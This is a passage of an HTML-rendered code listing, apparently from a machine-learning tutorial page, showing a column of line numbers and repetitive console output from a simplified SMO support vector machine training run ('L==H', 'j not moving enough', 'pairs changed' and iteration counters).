class="line">1245</div><div class="line">1246</div><div class="line">1247</div><div class="line">1248</div><div class="line">1249</div><div class="line">1250</div><div class="line">1251</div><div class="line">1252</div><div class="line">1253</div><div class="line">1254</div><div class="line">1255</div><div class="line">1256</div><div class="line">1257</div><div class="line">1258</div><div class="line">1259</div><div class="line">1260</div><div class="line">1261</div><div class="line">1262</div><div class="line">1263</div><div class="line">1264</div><div class="line">1265</div><div class="line">1266</div><div class="line">1267</div><div class="line">1268</div><div class="line">1269</div><div class="line">1270</div><div class="line">1271</div><div class="line">1272</div><div class="line">1273</div><div class="line">1274</div><div class="line">1275</div><div class="line">1276</div><div class="line">1277</div><div class="line">1278</div><div class="line">1279</div><div class="line">1280</div><div class="line">1281</div><div class="line">1282</div><div class="line">1283</div><div class="line">1284</div><div class="line">1285</div><div class="line">1286</div><div class="line">1287</div><div class="line">1288</div><div class="line">1289</div><div class="line">1290</div><div class="line">1291</div><div class="line">1292</div><div class="line">1293</div><div class="line">1294</div><div class="line">1295</div><div class="line">1296</div><div class="line">1297</div><div class="line">1298</div><div class="line">1299</div><div class="line">1300</div><div class="line">1301</div><div class="line">1302</div><div class="line">1303</div><div class="line">1304</div><div class="line">1305</div><div class="line">1306</div><div class="line">1307</div><div class="line">1308</div><div class="line">1309</div><div class="line">1310</div><div class="line">1311</div><div class="line">1312</div><div class="line">1313</div><div class="line">1314</div><div class="line">1315</div><div class="line">1316</div><div class="line">1317</div><div class="line">1318</div><div class="line">1319</div><div class="line">1320</div><div class="line">1321</div><div class="line">1322</div><div class="line">1323</div><div class="line">1324</div><div class="line">1325</div><div class="line">1326</div><div class="line">1327</div><div class="line">1328</div><div class="line">1329</div><div class="line">1330</div><div class="line">1331</div><div class="line">1332</div><div class="line">1333</div><div class="line">1334</div><div class="line">1335</div><div class="line">1336</div><div class="line">1337</div><div class="line">1338</div><div class="line">1339</div><div class="line">1340</div><div class="line">1341</div><div class="line">1342</div><div class="line">1343</div><div class="line">1344</div><div class="line">1345</div><div class="line">1346</div><div class="line">1347</div><div class="line">1348</div><div class="line">1349</div><div class="line">1350</div><div class="line">1351</div><div class="line">1352</div><div class="line">1353</div><div class="line">1354</div><div class="line">1355</div><div class="line">1356</div><div class="line">1357</div><div class="line">1358</div><div class="line">1359</div><div class="line">1360</div><div class="line">1361</div><div class="line">1362</div><div class="line">1363</div><div class="line">1364</div><div class="line">1365</div><div class="line">1366</div><div class="line">1367</div><div class="line">1368</div><div class="line">1369</div><div class="line">1370</div><div class="line">1371</div><div class="line">1372</div><div class="line">1373</div><div class="line">1374</div><div class="line">1375</div><div class="line">1376</div><div class="line">1377</div><div class="line">1378</div><div class="line">1379</div><div class="line">1380</div><div class="line">1381</div><div class="line">1382</div><div class="line">1383</div><div class="line">1384</div><div class="line">1385</div><div class="line">1386</div><div class="line">1387</div><div class="line">1388</div><div class="line">1389</div><div class="line">1390</div><div class="line">1391</div><div class="line">1392</div><div class="line">1393</div><div class="line">1394</div><div class="line">1395</div><div class="line">1396</div><div class="line">1397</div><div class="line">1398</div><div class="line">1399</div><div class="line">1400</div><div class="line">1401</div><div class="line">1402</div><div class="line">1403</div><div class="line">1404</div><div class="line">1405</div><div class="line">1406</div><div class="line">1407</div><div class="line">1408</div><div class="line">1409</div><div class="line">1410</div><div class="line">1411</div><div class="line">1412</div><div class="line">1413</div><div class="line">1414</div><div class="line">1415</div><div class="line">1416</div><div class="line">1417</div><div class="line">1418</div><div class="line">1419</div><div class="line">1420</div><div class="line">1421</div><div class="line">1422</div><div class="line">1423</div><div class="line">1424</div><div class="line">1425</div><div class="line">1426</div><div class="line">1427</div><div class="line">1428</div><div class="line">1429</div><div class="line">1430</div><div class="line">1431</div><div class="line">1432</div><div class="line">1433</div><div class="line">1434</div><div class="line">1435</div><div class="line">1436</div><div class="line">1437</div><div class="line">1438</div><div class="line">1439</div><div class="line">1440</div><div class="line">1441</div><div class="line">1442</div><div class="line">1443</div><div class="line">1444</div><div class="line">1445</div><div class="line">1446</div><div class="line">1447</div><div class="line">1448</div><div class="line">1449</div><div class="line">1450</div><div class="line">1451</div><div class="line">1452</div><div class="line">1453</div><div class="line">1454</div><div class="line">1455</div><div class="line">1456</div><div class="line">1457</div><div class="line">1458</div><div class="line">1459</div><div class="line">1460</div><div class="line">1461</div><div class="line">1462</div><div class="line">1463</div><div class="line">1464</div><div class="line">1465</div><div class="line">1466</div><div class="line">1467</div><div class="line">1468</div><div class="line">1469</div><div class="line">1470</div><div class="line">1471</div><div class="line">1472</div><div class="line">1473</div><div class="line">1474</div><div class="line">1475</div><div class="line">1476</div><div class="line">1477</div><div class="line">1478</div><div class="line">1479</div><div class="line">1480</div><div class="line">1481</div><div class="line">1482</div><div class="line">1483</div><div class="line">1484</div><div class="line">1485</div><div class="line">1486</div><div class="line">1487</div><div class="line">1488</div><div class="line">1489</div><div class="line">1490</div><div class="line">1491</div><div class="line">1492</div><div class="line">1493</div><div class="line">1494</div><div class="line">1495</div><div class="line">1496</div><div class="line">1497</div><div class="line">1498</div><div class="line">1499</div><div class="line">1500</div><div class="line">1501</div><div class="line">1502</div><div class="line">1503</div><div class="line">1504</div><div class="line">1505</div><div class="line">1506</div><div class="line">1507</div><div class="line">1508</div><div class="line">1509</div><div class="line">1510</div><div class="line">1511</div><div class="line">1512</div><div class="line">1513</div><div class="line">1514</div><div class="line">1515</div><div class="line">1516</div><div class="line">1517</div><div class="line">1518</div><div class="line">1519</div><div class="line">1520</div><div class="line">1521</div><div class="line">1522</div><div class="line">1523</div><div class="line">1524</div><div class="line">1525</div><div class="line">1526</div><div class="line">1527</div><div class="line">1528</div><div class="line">1529</div><div class="line">1530</div><div class="line">1531</div><div class="line">1532</div><div class="line">1533</div><div class="line">1534</div><div class="line">1535</div><div class="line">1536</div><div class="line">1537</div><div class="line">1538</div><div class="line">1539</div><div class="line">1540</div><div class="line">1541</div><div class="line">1542</div><div class="line">1543</div><div class="line">1544</div><div class="line">1545</div><div class="line">1546</div><div class="line">1547</div><div class="line">1548</div><div class="line">1549</div><div class="line">1550</div><div class="line">1551</div><div class="line">1552</div><div class="line">1553</div><div class="line">1554</div><div class="line">1555</div><div class="line">1556</div><div class="line">1557</div><div class="line">1558</div><div class="line">1559</div><div class="line">1560</div><div class="line">1561</div><div class="line">1562</div><div class="line">1563</div><div class="line">1564</div><div class="line">1565</div><div class="line">1566</div><div class="line">1567</div><div class="line">1568</div><div class="line">1569</div><div class="line">1570</div><div class="line">1571</div><div class="line">1572</div><div class="line">1573</div><div class="line">1574</div><div class="line">1575</div><div class="line">1576</div><div class="line">1577</div><div class="line">1578</div><div class="line">1579</div><div class="line">1580</div><div class="line">1581</div><div class="line">1582</div><div class="line">1583</div><div class="line">1584</div><div class="line">1585</div><div class="line">1586</div><div class="line">1587</div><div class="line">1588</div><div class="line">1589</div><div class="line">1590</div><div class="line">1591</div><div class="line">1592</div><div class="line">1593</div><div class="line">1594</div><div class="line">1595</div><div class="line">1596</div><div class="line">1597</div><div class="line">1598</div><div class="line">1599</div><div class="line">1600</div><div class="line">1601</div><div class="line">1602</div><div class="line">1603</div><div class="line">1604</div><div class="line">1605</div><div class="line">1606</div><div class="line">1607</div><div class="line">1608</div><div class="line">1609</div><div class="line">1610</div><div class="line">1611</div><div class="line">1612</div><div class="line">1613</div><div class="line">1614</div><div class="line">1615</div><div class="line">1616</div><div class="line">1617</div><div class="line">1618</div><div class="line">1619</div><div class="line">1620</div><div class="line">1621</div><div class="line">1622</div><div class="line">1623</div><div class="line">1624</div><div class="line">1625</div><div class="line">1626</div><div class="line">1627</div><div class="line">1628</div><div class="line">1629</div><div class="line">1630</div><div class="line">1631</div><div class="line">1632</div><div class="line">1633</div><div class="line">1634</div><div class="line">1635</div><div class="line">1636</div><div class="line">1637</div><div class="line">1638</div><div class="line">1639</div><div class="line">1640</div><div class="line">1641</div><div class="line">1642</div><div class="line">1643</div><div class="line">1644</div><div class="line">1645</div><div class="line">1646</div><div class="line">1647</div><div class="line">1648</div><div class="line">1649</div><div class="line">1650</div><div class="line">1651</div><div class="line">1652</div><div class="line">1653</div><div class="line">1654</div><div class="line">1655</div><div class="line">1656</div><div class="line">1657</div><div class="line">1658</div><div class="line">1659</div><div class="line">1660</div><div class="line">1661</div><div class="line">1662</div><div class="line">1663</div><div class="line">1664</div><div class="line">1665</div><div class="line">1666</div><div class="line">1667</div><div class="line">1668</div><div class="line">1669</div><div class="line">1670</div><div class="line">1671</div><div class="line">1672</div><div class="line">1673</div><div class="line">1674</div><div class="line">1675</div><div class="line">1676</div><div class="line">1677</div><div class="line">1678</div><div class="line">1679</div><div class="line">1680</div><div class="line">1681</div><div class="line">1682</div><div class="line">1683</div><div class="line">1684</div><div class="line">1685</div><div class="line">1686</div><div class="line">1687</div><div class="line">1688</div><div class="line">1689</div><div class="line">1690</div><div class="line">1691</div><div class="line">1692</div><div class="line">1693</div><div class="line">1694</div><div class="line">1695</div><div class="line">1696</div><div class="line">1697</div><div class="line">1698</div><div class="line">1699</div><div class="line">1700</div><div class="line">1701</div><div class="line">1702</div><div class="line">1703</div><div class="line">1704</div><div class="line">1705</div><div class="line">1706</div><div class="line">1707</div><div class="line">1708</div><div class="line">1709</div><div class="line">1710</div><div class="line">1711</div><div class="line">1712</div><div class="line">1713</div><div class="line">1714</div><div class="line">1715</div><div class="line">1716</div><div class="line">1717</div><div class="line">1718</div><div class="line">1719</div><div class="line">1720</div><div class="line">1721</div><div class="line">1722</div><div class="line">1723</div><div class="line">1724</div><div class="line">1725</div><div class="line">1726</div><div class="line">1727</div><div class="line">1728</div><div class="line">1729</div><div class="line">1730</div><div class="line">1731</div><div class="line">1732</div><div class="line">1733</div><div class="line">1734</div><div class="line">1735</div><div class="line">1736</div><div class="line">1737</div><div class="line">1738</div><div class="line">1739</div><div class="line">1740</div><div class="line">1741</div><div class="line">1742</div><div class="line">1743</div><div class="line">1744</div><div class="line">1745</div><div class="line">1746</div><div class="line">1747</div><div class="line">1748</div><div class="line">1749</div><div class="line">1750</div><div class="line">1751</div><div class="line">1752</div><div class="line">1753</div><div class="line">1754</div><div class="line">1755</div><div class="line">1756</div><div class="line">1757</div><div class="line">1758</div><div class="line">1759</div><div class="line">1760</div><div class="line">1761</div><div class="line">1762</div><div class="line">1763</div><div class="line">1764</div><div class="line">1765</div><div class="line">1766</div><div class="line">1767</div><div class="line">1768</div><div class="line">1769</div><div class="line">1770</div><div class="line">1771</div><div class="line">1772</div><div class="line">1773</div><div class="line">1774</div><div class="line">1775</div><div class="line">1776</div><div class="line">1777</div><div class="line">1778</div><div class="line">1779</div><div class="line">1780</div><div class="line">1781</div><div class="line">1782</div><div class="line">1783</div><div class="line">1784</div><div class="line">1785</div><div class="line">1786</div><div class="line">1787</div><div class="line">1788</div><div class="line">1789</div><div class="line">1790</div><div class="line">1791</div><div class="line">1792</div><div class="line">1793</div><div class="line">1794</div><div class="line">1795</div><div class="line">1796</div><div class="line">1797</div><div class="line">1798</div><div class="line">1799</div><div class="line">1800</div><div class="line">1801</div><div class="line">1802</div><div class="line">1803</div><div class="line">1804</div><div class="line">1805</div><div class="line">1806</div><div class="line">1807</div><div class="line">1808</div><div class="line">1809</div><div class="line">1810</div><div class="line">1811</div><div class="line">1812</div><div class="line">1813</div><div class="line">1814</div><div class="line">1815</div><div class="line">1816</div></pre></td><td class="code"><pre><div class="line">L==H</div><div class="line">L==H</div><div class="line">iter: 0 i:2, pairs changed 1</div><div class="line">L==H</div><div class="line">L==H</div><div class="line">iter: 0 i:7, pairs changed 2</div><div class="line">iter: 0 i:8, pairs changed 3</div><div class="line">L==H</div><div class="line">L==H</div><div class="line">iter: 0 i:22, pairs changed 4</div><div class="line">iter: 0 i:23, pairs changed 5</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iter: 0 i:28, pairs changed 6</div><div class="line">L==H</div><div class="line">j not moving enough</div><div class="line">iter: 0 i:31, pairs changed 7</div><div class="line">j not moving enough</div><div class="line">L==H</div><div class="line">iter: 0 i:52, pairs changed 8</div><div class="line">iter: 0 i:54, pairs changed 9</div><div class="line">j not moving enough</div><div class="line">L==H</div><div class="line">j not moving enough</div><div class="line">L==H</div><div class="line">L==H</div><div class="line">j not moving enough</div><div class="line">L==H</div><div class="line">j not moving enough</div><div class="line">L==H</div><div class="line">L==H</div><div class="line">j not moving enough</div><div class="line">iteration number: 0</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iter: 0 i:2, pairs changed 1</div><div class="line">L==H</div><div class="line">iter: 0 i:7, pairs changed 2</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iter: 0 i:17, pairs changed 3</div><div class="line">iter: 0 i:22, pairs changed 4</div><div class="line">j not moving enough</div><div class="line">L==H</div><div class="line">L==H</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iter: 0 i:54, pairs changed 5</div><div class="line">iter: 0 i:55, pairs changed 6</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 0</div><div class="line">iter: 0 i:0, pairs changed 1</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iter: 0 i:24, pairs changed 2</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iter: 0 i:99, pairs changed 3</div><div class="line">iteration number: 0</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iter: 0 i:7, pairs changed 1</div><div class="line">iter: 0 i:8, pairs changed 2</div><div class="line">j not moving enough</div><div class="line">iter: 0 i:17, pairs changed 3</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iter: 0 i:54, pairs changed 4</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">L==H</div><div class="line">iteration number: 0</div><div class="line">j not moving enough</div><div class="line">iter: 0 i:2, pairs changed 1</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">L==H</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">L==H</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">L==H</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">L==H</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">L==H</div><div class="line">L==H</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 0</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">L==H</div><div class="line">j not moving enough</div><div class="line">L==H</div><div class="line">iter: 0 i:52, pairs changed 1</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 0</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iter: 0 i:8, pairs changed 1</div><div class="line">iter: 0 i:14, pairs changed 2</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iter: 0 i:25, pairs changed 3</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">L==H</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">L==H</div><div class="line">j not moving enough</div><div class="line">iter: 0 i:69, pairs changed 4</div><div class="line">j not moving enough</div><div class="line">L==H</div><div class="line">L==H</div><div class="line">iteration number: 0</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">L==H</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">L==H</div><div class="line">L==H</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">L==H</div><div class="line">j not moving enough</div><div class="line">iteration number: 1</div><div class="line">j not moving enough</div><div class="line">iter: 1 i:1, pairs changed 1</div><div class="line">j not moving enough</div><div class="line">L==H</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iter: 1 i:25, pairs changed 2</div><div class="line">j not moving enough</div><div class="line">L==H</div><div class="line">j not moving enough</div><div class="line">iter: 1 i:45, pairs changed 3</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iter: 1 i:69, pairs changed 4</div><div class="line">j not moving enough</div><div class="line">iter: 1 i:94, pairs changed 5</div><div class="line">iteration number: 0</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">L==H</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iter: 0 i:69, pairs changed 1</div><div class="line">j not moving enough</div><div class="line">iteration number: 0</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iter: 0 i:55, pairs changed 1</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">L==H</div><div class="line">L==H</div><div class="line">L==H</div><div class="line">j not moving enough</div><div class="line">iteration number: 0</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iter: 0 i:24, pairs changed 1</div><div class="line">j not moving enough</div><div class="line">iter: 0 i:29, pairs changed 2</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">L==H</div><div class="line">j not moving enough</div><div class="line">iteration number: 0</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iter: 0 i:30, pairs changed 1</div><div class="line">j not moving enough</div><div class="line">iter: 0 i:52, pairs changed 2</div><div class="line">j not moving enough</div><div class="line">iter: 0 i:55, pairs changed 3</div><div class="line">j not moving enough</div><div class="line">iteration number: 0</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">L==H</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 1</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 2</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">L==H</div><div class="line">j not moving enough</div><div class="line">iter: 2 i:30, pairs changed 1</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">L==H</div><div class="line">L==H</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 0</div><div class="line">j not moving enough</div><div class="line">L==H</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">L==H</div><div class="line">iter: 0 i:26, pairs changed 1</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">L==H</div><div class="line">j not moving enough</div><div class="line">iteration number: 0</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iter: 0 i:55, pairs changed 1</div><div class="line">iter: 0 i:65, pairs changed 2</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">L==H</div><div class="line">L==H</div><div class="line">iteration number: 0</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iter: 0 i:17, pairs changed 1</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">L==H</div><div class="line">j not moving enough</div><div class="line">iter: 0 i:52, pairs changed 2</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 0</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iter: 0 i:62, pairs changed 1</div><div class="line">iter: 0 i:65, pairs changed 2</div><div class="line">j not moving enough</div><div class="line">iteration number: 0</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">L==H</div><div class="line">iter: 0 i:11, pairs changed 1</div><div class="line">iter: 0 i:17, pairs changed 2</div><div class="line">iter: 0 i:23, pairs changed 3</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iter: 0 i:46, pairs changed 4</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 0</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iter: 0 i:54, pairs changed 1</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iter: 0 i:97, pairs changed 2</div><div class="line">iteration number: 0</div><div class="line">j not moving enough</div><div class="line">L==H</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iter: 0 i:62, pairs changed 1</div><div class="line">j not moving enough</div><div class="line">iteration number: 0</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iter: 0 i:55, pairs changed 1</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 0</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 1</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iter: 1 i:26, pairs changed 1</div><div class="line">j not moving enough</div><div class="line">iter: 1 i:45, pairs changed 2</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iter: 1 i:55, pairs changed 3</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 0</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iter: 0 i:30, pairs changed 1</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iter: 0 i:55, pairs changed 2</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 0</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 1</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iter: 1 i:69, pairs changed 1</div><div class="line">j not moving enough</div><div class="line">iteration number: 0</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 1</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 2</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 3</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iter: 3 i:97, pairs changed 1</div><div class="line">iteration number: 0</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 1</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 2</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 3</div><div class="line">j not moving enough</div><div class="line">iter: 3 i:23, pairs changed 1</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 0</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 1</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 2</div><div class="line">j not moving enough</div><div class="line">iter: 2 i:29, pairs changed 1</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 0</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 1</div><div class="line">iter: 1 i:23, pairs changed 1</div><div class="line">j not moving enough</div><div class="line">iter: 1 i:52, pairs changed 2</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 0</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 1</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 2</div><div class="line">j not moving enough</div><div class="line">iter: 2 i:29, pairs changed 1</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 0</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 1</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 2</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 3</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 4</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iter: 4 i:54, pairs changed 1</div><div class="line">j not moving enough</div><div class="line">iteration number: 0</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 1</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 2</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 3</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 4</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div 